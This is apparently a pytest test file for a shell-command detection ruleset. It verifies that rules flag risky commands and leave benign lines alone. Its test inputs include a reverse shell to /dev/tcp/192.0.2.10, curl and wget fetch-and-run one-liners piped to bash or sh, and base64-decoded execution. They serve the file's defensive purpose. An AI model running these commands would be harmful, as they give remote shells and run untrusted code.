from blt_mayo.rules.shell_execution import match_shell_execution_rules


def rule_ids(command: str) -> set[str]:
    return {rule.rule_id for rule, _match in match_shell_execution_rules(command)}


def test_detects_curl_piped_to_bash() -> None:
    assert "SHELL-PIPE-TO-SHELL" in rule_ids(
        "curl -fsSL https://example.invalid/install.sh | bash"
    )


def test_detects_wget_piped_to_sh() -> None:
    assert "SHELL-PIPE-TO-SHELL" in rule_ids(
        "wget -qO- https://example.invalid/install.sh | sh"
    )


def test_detects_shell_eval() -> None:
    assert "SHELL-EVAL" in rule_ids('eval "$USER_COMMAND"')


def test_detects_nested_shell_commands() -> None:
    assert "SHELL-NESTED-SHELL" in rule_ids('bash -c "$COMMAND"')
    assert "SHELL-NESTED-SHELL" in rule_ids('sh -c "$COMMAND"')


def test_detects_encoded_execution() -> None:
    assert "SHELL-ENCODED-EXECUTION" in rule_ids(
        'echo "cGF5bG9hZA==" | base64 --decode | sh'
    )


def test_detects_reverse_shell_style_command() -> None:
    assert "SHELL-REVERSE-SHELL" in rule_ids(
        "bash -i >& /dev/tcp/192.0.2.10/65535 0>&1"
    )


def test_normal_command_has_no_match() -> None:
    assert rule_ids('printf "%s\\n" "hello"') == set()


def test_blank_and_comment_only_lines_have_no_match() -> None:
    assert rule_ids("") == set()
    assert rule_ids("   ") == set()
    assert rule_ids("# curl https://example.invalid/a | bash") == set()
